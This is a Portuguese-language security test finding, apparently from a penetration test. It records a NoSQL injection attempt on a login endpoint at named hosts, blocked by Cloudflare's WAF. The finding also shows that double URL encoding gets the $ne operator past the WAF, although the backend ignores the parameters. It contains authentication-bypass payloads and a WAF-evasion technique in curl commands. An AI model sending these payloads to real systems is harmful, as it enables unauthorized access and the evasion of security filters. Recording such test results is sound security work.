# F-013 URL-encoded NoSQLi Bloqueado por Cloudflare WAF
Alvo: mng.stormapplications.com, api-beta.stormapplications.com
Severidade: Info (WAF bypass possível)
Timestamp: 2026-08-23T05:25:00Z

## Descrição
Tentativas de NoSQLi via query string URL-encoded são bloqueadas pelo
Cloudflare WAF (conexão dropada/silenciosamente descartada).

## Teste
```bash
curl "https://mng.stormapplications.com/api/login?username[\$ne]=&password[\$ne]="
```

Resultado: timeout/conexão dropada. Sem resposta HTTP.

## WAF Bypass
Double URL encoding bypassa o WAF:
```bash
curl "https://mng.stormapplications.com/api/login?username%25255B%25254ne%25255D=&password%25255B%25254ne%25255D="
```

Resultado: HTTP 200 com página Handlebars (parâmetros ignorados).

## Interpretação
Cloudflare filtra `$ne` e similares em query strings. Double URL encoding
permite atingir o backend, mas os parâmetros não são usados em queries
MongoDB neste endpoint específico.
